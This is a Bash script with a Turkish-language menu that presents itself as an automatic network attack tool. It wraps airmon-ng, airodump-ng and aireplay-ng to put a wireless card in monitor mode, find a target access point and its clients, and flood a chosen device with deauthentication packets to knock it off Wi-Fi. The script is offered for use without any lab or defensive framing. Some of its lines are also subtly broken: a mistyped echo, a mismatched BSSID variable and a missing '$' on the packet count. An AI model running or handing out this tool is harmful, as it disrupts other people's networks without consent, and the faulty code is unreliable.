if ! pip show python-cfonts &> /dev/null; then
  pip install python-cfonts
fi

Black="\033[1;30m"       # Black
Red="\033[1;31m"         # Red
Green="\033[1;32m"       # Green
Yellow="\033[1;33m"      # Yellow
Blue="\033[1;34m"        # Blue
Purple="\033[1;35m"     # Purple
Cyan="\033[1;36m"        # Cyan
White="\033[1;37m"      # White

python -c "from cfonts import render, say; qawe = render('aireplay-ng', colors=['cyan', 'white'], align='center', font='block'); print(qawe)"
echo -e "\e[1m\e[32mDevper\e[0m \e[1m\e[36mqwexsa\e[0m"
echo -e "\e[1;32mDiscord\e[0m \e[1m\e[36mqawe1\e[0m"
echo -e "\e[1;36motomatik internet atak tooluna hoşgeldin!!\e[0m"

echo -e "\e[1;33m{1} - monitör moda geçiş\e[0m"
echo -e "\e[1;33m{2} - çıkış\e[0m"
echo -e "\e[1;33m{3} - ağlara saldırma\e[0m"
echo -e "\e[1;33m{4} - developer ile iletişim\e[0m"

read -p "seçimini yap dostum : " secim

case $secim in
  1)
    iwconfig
    echo "Monitör moda geçiş"
    read -p "ağ kartı adını gir dostum " agkart
    sudo airmon-ng start $agkart
    echo -e "\e[33m{1} - hedef erişim noktasını bulma\e[1m"
    echo -e "\e[32m{2} - geri dön\e[1m"
    read -p "seçim vakti yeğen : " secim2
    case $secim2 in
      1)
        echo -e "\e[97mhedefini gödükten ctrl c bas!!\e[97m"
        sleep 3
        sudo airodump-ng $agkart
        echo "şimdi hedef erişim noktasına bağlı cihazları görelim"
        read -p "hedef BSSID gir : " bssid
        read -p "hedef kanalı gir : " kanalehe
        echo-e "\e[93mAz sonraki taramayı durdurmak içi ctrl c basınız!!\e[92m"
        sleep 3
        sudo airodump-ng --bssid $bssid --channel $kanalehe $agkart
        echo "saldırıya hazır sayılırsın!!"
        read -p "paket sayısını gir : " paket
       read -p "hedef mac adresini gir : " mac
        sudo aireplay-ng --deauth $paket -c $mac -a $bssid $agkart
        ;;
      2)
        echo "Geri dönülüyor."
        ;;
      *)
        echo "Geçersiz seçim. Lütfen tekrar deneyin."
        ;;    esac
    ;;
  3)
    read -p "ağ kartı adını gir dostum : " agkart
    sudo airmon-ng start $agkart
    echo -e "\e[33m{1} - hedef erişim noktasını bulma\e[1m"
    echo -e "\e[32m{2} - geri dön\e[1m"
    read -p "seçim vakti yeğen : " secim2   
 case $secim2 in
      1)
        echo -e "\e[97mhedefini gördükten ctrl c bas!!\e[97m"
        sleep 3
        sudo airodump-ng $agkart
        echo "şimdi hedef erişim noktasına bağlı cihazları görelim"
        read -p "hedef BSSID gir : " bsid
        read -p "hedef kanalı gir : " kanalehe
        echo -e "\e[93mAz sonraki taramayı durdurmak içi ctrl c basınız!!\e[92m"
        sleep 3
        sudo airodump-ng --bssid $bssid --channel $kanalehe $agkart
        echo "saldırıya hazır sayılırsın!!"
        read -p "paket sayısını gir : " paket
        read -p "hedef mac adresini gir : " mac
        sudo aireplay-ng --deauth paket -c $mac -a $bssid $agkart
        ;;
      2)
        echo "Geri dönülüyor."
        ;;
      *)
        echo "Geçersiz seçim. Lütfen tekrar deneyin."
        ;;
    esac
    ;;
  4)
    echo -e "\e[32mdiscord : qawe1, github : qwexsa1\e[1m"
   ;;
  2)
    echo "Çıkış"
    exit
    ;;
  *)
    echo "Geçersiz seçim. Lütfen tekrar deneyin."
    ;;
esac
